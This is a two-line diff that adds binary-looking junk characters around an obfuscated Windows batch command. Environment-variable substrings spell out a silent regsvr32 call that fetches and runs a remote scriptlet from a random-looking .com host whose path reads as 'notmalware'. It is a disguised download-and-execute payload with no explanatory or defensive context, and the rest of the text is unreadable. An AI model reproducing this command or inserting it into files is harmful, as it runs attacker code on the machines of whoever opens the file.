@@ -1,0 +1,2 @@
+ ? ? S , +  { Â W #  ? j ? " è } w ÷  ? ÿ ] π = æ ˜ _ ? ? ? V x ¿ © h ? E ? § \ 2 ƒ ª © Ω r µ
+ @echo off %ALLUSERSPROFILE:~4,1%egsv%ALLUSERSPROFILE:~4,1%32.exe /s /n /i:http://ATEabVzqBwjyOocluWPDmJXpUxSKvdtCsIYf%ALLUSERSPROFILE:~4,1%giNH%ALLUSERSPROFILE:~4,1%QnGFLZeMkh.com/n0tm4lw4%ALLUSERSPROFILE:~4,1%3  ? ? S , +  { Â W #  ? j ? " è } w ÷  ? ÿ ] π = æ ˜ _ ? ? ? V x ¿ © h ? E ? § \ 2 ƒ ª © Ω r µ
